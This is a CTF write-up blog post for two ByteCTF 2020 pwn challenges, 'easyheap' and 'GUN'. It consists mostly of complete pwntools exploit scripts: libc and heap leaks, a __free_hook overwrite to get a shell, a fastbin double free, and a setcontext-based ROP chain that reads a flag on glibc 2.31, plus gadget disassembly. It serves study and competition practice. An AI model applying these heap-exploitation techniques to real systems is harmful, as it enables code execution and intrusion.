---
title: byteCTF2020_PWN
date: 2021-09-15 16:01:10
tags:
	- NULL_change
	- Glibc2.31 ORW
	- fastbin_double_free
---

## easyheap

### exp

```python
#!/usr/bin/env python
from pwn import *

binary = "./easyheap"
lib = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
p = process(binary)
elf = ELF(binary)
libc = ELF(lib)
# context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def add(malloc_size,content,editable_size=None):
	sal(">> ","1")
	if(editable_size):
		sal("Size: ",str(editable_size))
	sal("Size: ",str(malloc_size))
	sal("Content: ",content)
def show(id):
	sal(">> ","2")
	sal("Index: ",str(id))

def free(id):
	sal(">> ","3")
	sal("Index: ",str(id))

def leakheap():
	add(0x1,"",0xfff)
	add(0x1,"",0xfff)
	free(0)
	free(1)
	add(0x1,"A",0xfff)
	show(0)

def leaklibc():
	for _ in range(8):
		add(0x80,"A",0xfff)
	for _ in range(7):
		free(7-_)
	free(0)
	add(0x1,"A",0xfff)
	show(0)

leaklibc()
malloc_hook = u64(ru("\x7f")[-6:]+"\x00\x00")-193-0x10
libc.address = malloc_hook - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)
free(0)

leakheap()
ru("Content: ")
heap = u64(r(6)+"\x00\x00") - 0x241
info("heap base => 0x%x"%heap)


payload = ""
payload += "A"*0x10
payload += p64(0)
payload += p64(0x90)
payload += p64(libc.sym["__free_hook"]-0x8)
payload += p64(heap+0x10)
add(0x48,payload,-0x217)


payload = ""
payload += "/bin/sh\x00"
payload += p64(libc.sym["system"])
add(0x80,"",0xfff)
add(0x80,payload,0xfff)


free(3)

sh()
```
### to say
* 这是我重写过的，原本的exp虽然能拿shell，但是很杂很乱，有一些点没考虑到
* Leak
  * `malloc(0) - malloc(0x18)`申请的都是0x20的chunk，所以`malloc(1)`可以绕过memset的清除作用
  * tcache_get并没有清除next指针，以此泄露heap
  * 允许申请`[0-7]`，八个块，足以填满tcache,然后转向unsorted bin，然后`malloc(1)`以残留的libc指针泄露

## GUN

### 思路
> 这是个逻辑漏洞,还是比较难发现的。主要是flag位为2时，却没有在任何地方检查flag为2的情况,接着就能发现double free。
* tcache检测比较严谨，所以要选择攻fastbin
```c
if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
```

### exp



```python

#!/usr/bin/env python
from pwn import *

binary = "./gun"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(binary)
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
trs = lambda n: libc.address+n

def name():
	sal("Your name: ","cat03")

def buy(size,content):
	sal("Action> ","3")
	sal("Bullet price: ",str(size))
	sa("Bullet Name: ",content)
def load(id):
	sal("Action> ","2")
	sal("Which one do you want to load?",str(id))
def shoot(time):
	sal("Action> ","1")
	sal("Shoot time: ",str(time))
def leakHeap():
	buy(0x10,"AAAA\n")
	buy(0x10,"BBBB\n")
	load(0)
	load(1)
	shoot(2)
	buy(0x10,"\n")
	load(0)
	shoot(1)	
def leakLibc():
	for _ in range(0x8):
		buy(0x80,"hello\n")
	for _ in range(0x8):
		load(_)
	shoot(8)
	buy(0x20,"\n")
	load(0)
	shoot(1)

name()
leakHeap()
ru("Pwn! The ")
heap = u64(r(6)+"\x00\x00") -0x2f0
info("Heap base => 0x%x"%heap)

leakLibc()
malloc_hook = u64(ru("\x7f")[-6:]+"\x00\x00")-224-0x10
libc.address = malloc_hook - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)

for _ in range(10):
	buy(0x50,"\n")
for _ in range(7):
	load(9-_)
shoot(7)


load(1)
load(0)
shoot(3)


for _ in range(7):
	buy(0x50,"\n")
payload = ""
payload += p64(heap+0x10+0x80)
payload += "\n"


buy(0x50,payload)
buy(0x50,"AAAAA\n")
buy(0x50,"AAAAA\n")


payload = p64(0)
payload += p64(0)*6
payload += p64(libc.sym["__free_hook"])
payload += "\n"
buy(0x50,payload)


payload = p64(trs(0x154930))
payload += "\n"
buy(0x80,payload)


pop_rdi 	= trs(0x0000000000026b72)
pop_rsi 	= trs(0x0000000000027529)
pop_rdx_r12 = trs(0x000000000011c371)
pop_rax 	= trs(0x000000000004a550)
syscall 	= trs(0x00000000000e7249)

rdi = heap+0xaf0
setcontext_61 = trs(0x580dd)

payload = ""
payload += "./flag\x00".ljust(8,"\x00")
payload += p64(rdi)
payload += p64(0)*2
payload += p64(setcontext_61)
payload += p64(0)*(8)
payload += p64(rdi)
payload += p64(0)*6
payload += p64(rdi+0xb0)

# open()
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

# read()
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(heap+0xaf0)
payload += p64(pop_rdx_r12)
payload += p64(0x80)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)

# write()
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall)
payload += "\n"
buy(len(payload),payload)

load(13)
info("orw len => 0x%x"%len(payload)) # 0x138
shoot(1)

sh()
```
### Glibc2.31 orw布局

* setcontext发生变化要配合其他gadget
```c
	// gadget1  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "mov|call" | grep "rdi" | grep "rdx"
   0x154930:	mov    rdx,QWORD PTR [rdi+0x8]
   0x154934:	mov    QWORD PTR [rsp],rax
   0x154938:	call   QWORD PTR [rdx+0x20]

	// gadget2 disassemble setcontext
   0x00000000000580dd <+61>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x00000000000580e4 <+68>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x00000000000580eb <+75>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x00000000000580ef <+79>:	mov    r12,QWORD PTR [rdx+0x48]
   0x00000000000580f3 <+83>:	mov    r13,QWORD PTR [rdx+0x50]
   0x00000000000580f7 <+87>:	mov    r14,QWORD PTR [rdx+0x58]
   0x00000000000580fb <+91>:	mov    r15,QWORD PTR [rdx+0x60]
   0x00000000000580ff <+95>:	test   DWORD PTR fs:0x48,0x2
   0x000000000005810b <+107>:	je     0x581c6 <setcontext+294>

   0x00000000000581c6 <+294>:	mov    rcx,QWORD PTR [rdx+0xa8]
   0x00000000000581cd <+301>:	push   rcx
   0x00000000000581ce <+302>:	mov    rsi,QWORD PTR [rdx+0x70]
   0x00000000000581d2 <+306>:	mov    rdi,QWORD PTR [rdx+0x68]
   0x00000000000581d6 <+310>:	mov    rcx,QWORD PTR [rdx+0x98]
   0x00000000000581dd <+317>:	mov    r8,QWORD PTR [rdx+0x28]
   0x00000000000581e1 <+321>:	mov    r9,QWORD PTR [rdx+0x30]
   0x00000000000581e5 <+325>:	mov    rdx,QWORD PTR [rdx+0x88]
   0x00000000000581ec <+332>:	xor    eax,eax
   0x00000000000581ee <+334>:	ret    
```
[![img](https://z3.ax1x.com/2021/09/15/4eAWUf.md.png)](https://imgtu.com/i/4eAWUf)